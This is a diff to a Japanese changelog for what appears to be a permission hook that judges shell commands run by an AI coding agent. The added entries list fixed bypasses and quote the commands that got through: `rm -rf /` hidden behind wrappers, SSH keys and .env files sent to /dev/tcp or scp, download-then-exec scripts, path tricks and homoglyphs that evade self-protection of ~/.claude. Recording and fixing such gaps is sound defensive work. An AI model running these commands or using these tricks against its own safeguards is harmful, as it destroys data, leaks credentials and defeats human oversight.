@@ -24,6 +24,42 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   問題を修正。降格後も rule 自身の `Ask` を下回らない。TLA+ モデル
   (`formal/tla/DecisionPipeline.tla`) で検出。
 
+- `timeout` / `nohup` / `nice` / `ionice` / `stdbuf` / `setsid` / `/usr/bin/time` /
+  `chroot` / `chrt` / `taskset` / `flock` / `unshare` / `busybox` を前置すると
+  内側のコマンドが判定されず、`timeout 9 rm -rf /` などが allow になっていた問題を修正。
+  これらを prefix wrapper として peel する (`timeout DURATION` などの operand も
+  読み飛ばす)。(#252)
+- `bash -c` / `su -c` / `eval` / `xargs` / `find -exec` の payload が prefix wrapper の
+  内側にあると再 parse されず、`sudo su -c 'rm -rf /'` が allow になっていた問題を修正。
+- `sudo cat $(echo .env)` のように `$(…)` を含むコマンドで reader が wrapper の
+  内側にあると、`sensitive-bash-read` が発火しなかった問題を修正。
+- `>${IFS}out` のように redirect 演算子と target の間に `${IFS}` を置くと
+  target を見失い、`cat .env >${IFS}/dev/tcp/…` などが判定を逃れていた問題を修正。
+- `~//.claude` のように `~/` の直後に `/` を重ねると、`Path::join` が絶対パス
+  `/.claude` として扱い HOME の外を指していたため、self-protection が
+  `rm -rf ~//.claude` を許可していた問題を修正。
+- 機密パスの照合 (`~/.config//gh/hosts.yml`, `~/.kube/./config` など) と
+  download-then-exec の「保存したファイルと実行するファイルが同じか」の比較
+  (`> /tmp//i.sh && bash /tmp/./i.sh`) で、`//` と `/./` を畳んでから比べる。
+- `>|` / `n>|` (noclobber を無視する上書き) の `|` を pipe と解釈し、target を
+  別コマンドとして扱っていたため、`echo {} >| ~/.claude/settings.json` が allow、
+  `cat ~/.ssh/id_rsa >| /dev/tcp/…` が ask に格下げされていた問題を修正
+  (#258 / #262 のうち `>|` の部分)。
+- download-then-exec が `/usr/bin/bash /tmp/i.sh` のように interpreter を絶対パスで
+  呼ぶと head を実行ファイルとみなし、第 1 引数のスクリプトを見ていなかった問題を修正。
+- `sensitive-path-to-network` が `bash -c` / `su -c` / `eval` のコード内の pipeline を
+  見ておらず、`bash -c 'scp ~/.ssh/id_rsa host:'` や `su -c 'cat .env > /dev/tcp/…'` が
+  deny から ask (su は allow) に格下げされていた問題を修正。コードを 1 つのシェルとして
+  再 parse し、pipeline 単位の判定をそのまま適用する。
+- self-protection が `bash -c 'cd ~/.claude && echo {} > settings.json'` と
+  `cd ~/.claude && sh -c 'echo {} > settings.json'` をすり抜けていた問題を修正。
+  payload のコードは外側の cwd から始まる子シェルとして `cd` を追跡する
+  (payload 内の `cd` は外側の cwd を動かさない)。
+- `su -c 'cat .еnv'` のように payload に非 ASCII を含むと、再 parse で Latin-1 の
+  展開が 2 重にかかり homoglyph の正規化が効かなかった問題を修正。
+- 上記はいずれも bash の等価変形による有界網羅テスト
+  (`tests/bash_quote_equivalence.rs`) で検出。
+
 ### Fixed
 - audit JSONL: 記録中に死んだ ptuf (hook timeout の SIGKILL / ENOSPC) が
   改行なしの断片を残すと、次のプロセスのレコードがその断片に連結され、
